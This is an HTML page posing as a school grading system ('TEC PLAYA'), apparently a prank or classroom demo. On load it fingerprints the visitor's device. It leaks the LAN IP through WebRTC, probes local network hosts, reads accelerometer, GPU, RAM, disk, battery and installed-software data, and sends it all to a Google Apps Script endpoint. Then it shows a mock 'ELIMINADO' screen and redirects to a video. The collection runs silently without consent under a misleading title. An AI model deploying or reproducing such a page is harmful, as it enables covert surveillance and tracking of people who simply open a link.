<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>SISTEMA DE CALIFICACIONES - TEC PLAYA</title>
    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --pink: #ed1b76; --green: #037a76; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Quicksand', sans-serif; height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        #audit-panel { border: 2px solid var(--pink); padding: 40px; background: rgba(237, 27, 118, 0.05); text-align: center; max-width: 900px; width: 95%; box-shadow: 0 0 60px var(--pink); }
        .glitch { font-size: 3.5em; color: var(--pink); font-weight: 700; text-transform: uppercase; margin: 0; }
        #console { text-align: left; background: #000; padding: 20px; border-left: 5px solid var(--green); color: #00ffcc; font-family: 'Courier New', monospace; font-size: 0.85em; margin-top: 25px; line-height: 1.5; max-height: 400px; overflow-y: auto; }
        .danger { color: #ff4d4d; font-weight: bold; }
    </style>
</head>
<body>

<div id="audit-panel">
    <div style="font-size:35px; color:var(--pink); margin-bottom:15px;">○ △ □</div>
    <h1 id="status">IDENTIFICANDO...</h1>
    <div id="console" id="log-box">
        > Iniciando bypass de seguridad de red...<br>
        > Extrayendo metadatos de hardware y periféricos...<br>
    </div>
    <p id="timer" style="margin-top:25px; color:var(--green); font-weight: 700;">VOLCADO DE DATA EXTRA EN: 10...</p>
</div>

<script>
/* ==========================================================================
   SCORM ADAPTER - COMPATIBILIDAD SCRIPT MAESTRO TUP V2.1
   ========================================================================== */
const TUP_CONFIG = {
    activityId: "MINADO_FORENSE_2026",
    scriptUrl: "https://script.google.com/macros/s/AKfycbwuyrdlN36c4cSAMEDUmwm3m3pF6gbjcIN0U41FS2byd5B49wTTGjVXb12HRXUtM-zSVg/exec"
};

const sendToTUP = (data) => {
    const payload = {
        sheetName: TUP_CONFIG.activityId,
        id: data.ipv4 || "Anónimo",
        name: "ELIMINADO: " + (data.gpu_short || "Desconocido"),
        score: data.bat || 0,
        progress: data.ram || 0,
        device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        action: "Exfiltración Forense",
        // [BYPASS] Tu script inmutable lee la llave 'details' para la Columna 8
        details: data 
    };
    const url = `${TUP_CONFIG.scriptUrl}?q=${encodeURIComponent(JSON.stringify(payload))}`;
    if (navigator.sendBeacon) navigator.sendBeacon(url);
    else fetch(url, { mode: 'no-cors', keepalive: true });
};

/* ==========================================================================
   MÓDULOS DE MINERÍA RESILIENTES (CON TIMEOUTS)
   ========================================================================== */

// Helper: Promesa con tiempo límite para evitar que la página se "pasme"
const withTimeout = (promise, ms) => Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), ms))
]);

// 1. IP Interna (WebRTC Leak)
const getInternalIP = async () => {
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (i.candidate) resolve(i.candidate.candidate.split(" ")[4]);
        };
        setTimeout(() => resolve("n/a"), 1500); // Máximo 1.5s de espera
    });
};

// 2. Escaneo de Dispositivos en Red Local
const scanLocalNodes = async (lanIP) => {
    if (!lanIP || lanIP === "n/a") return "Omitido";
    const base = lanIP.split('.').slice(0, 3).join('.');
    const nodes = [1, 254, 100, 105]; // IPs probables de Gateways/TVs
    const found = [];
    
    await Promise.allSettled(nodes.map(n => 
        withTimeout(fetch(`http://${base}.${n}`, { mode: 'no-cors' }), 800)
        .then(() => found.push(`${base}.${n}`))
        .catch(() => {})
    ));
    return found.length > 0 ? found.join(", ") : "Solo dispositivo local";
};

// 3. Biometría de Movimiento (Acelerómetro)
let motionState = "Estatura desconocida";
const startMotionCapture = () => {
    if (window.DeviceMotionEvent) {
        window.ondevicemotion = (e) => {
            const acc = e.accelerationIncludingGravity;
            if (!acc) return;
            // Cálculo de fuerza G: $F = \sqrt{a_x^2 + a_y^2 + a_z^2}$
            const force = Math.sqrt(acc.x**2 + acc.y**2 + acc.z**2);
            motionState = (force > 12) ? "Caminando" : "Reposo / Acostado";
        };
    }
};

// 4. Auditoría de Software (Fuentes)
const detectSoftware = () => {
    const check = ["AutoCAD", "Revit", "Autodesk", "Adobe", "Photoshop", "SketchUp", "Office"];
    const found = [];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
    check.forEach(f => {
        ctx.font = `72px "${f}", monospace`;
        if (ctx.measureText("mmmmmmmmmmlli").width !== baseWidth) found.push(f);
    });
    return found.length > 0 ? found.join(", ") : "Estándar";
};

/* --- EJECUCIÓN --- */
async function forensicAudit() {
    const log = document.getElementById('console');
    const add = (m) => { log.innerHTML += `> ${m}<br>`; log.scrollTop = log.scrollHeight; };
    startMotionCapture();

    // Paralelismo total para evitar bloqueos
    const [v4Data, v6Data, lanIP] = await Promise.allSettled([
        withTimeout(fetch('https://api.ipify.org?format=json').then(r => r.json()), 2500),
        withTimeout(fetch('https://api64.ipify.org?format=json').then(r => r.json()), 2500),
        getInternalIP()
    ]);

    const ipv4 = v4Data.status === 'fulfilled' ? v4Data.value.ip : "n/a";
    const nodes = await scanLocalNodes(lanIP.value);

    // Hardware DNA
    const gl = document.createElement('canvas').getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Genérica";
    const storage = await navigator.storage.estimate();
    
    const dump = {
        ipv4: ipv4,
        ipv6: v6Data.status === 'fulfilled' ? v6Data.value.ip : "n/a",
        ip_lan: lanIP.value,
        nodos_red: nodes,
        gpu_full: gpu,
        gpu_short: gpu.split(',')[1] || gpu.substring(0, 30),
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "n/a",
        disco: Math.round(storage.quota / (1024**3)) + " GB",
        pantalla: `${screen.width}x${screen.height} (DPR: ${window.devicePixelRatio})`,
        movimiento: motionState,
        software: detectSoftware(),
        bat: 0,
        os: navigator.platform,
        ua: navigator.userAgent
    };

    try { const b = await navigator.getBattery(); dump.bat = Math.floor(b.level * 100); } catch(e) {}

    add(`IP PÚBLICA: <span class="danger">${dump.ipv4}</span>`);
    add(`IP INTERNA (LAN): ${dump.ip_lan}`);
    add(`NODOS ACTIVOS: ${nodes}`);
    add(`ESTADO BIOMÉTRICO: ${motionState}`);
    add(`SOFTWARE: ${dump.software}`);
    add(`<span style="color:#ed1b76">REPORTE FORENSE ENVIADO A COLUMNA 8</span>`);

    document.getElementById('status').innerText = "ELIMINADO";
    sendToTUP(dump);

    let t = 10;
    setInterval(() => {
        t--; document.getElementById('timer').innerText = `VOLCADO DE RED COMPLETO EN: ${t}...`;
        if(t <= 0) window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }, 1000);
}

window.onload = forensicAudit;
</script>
</body>
</html>
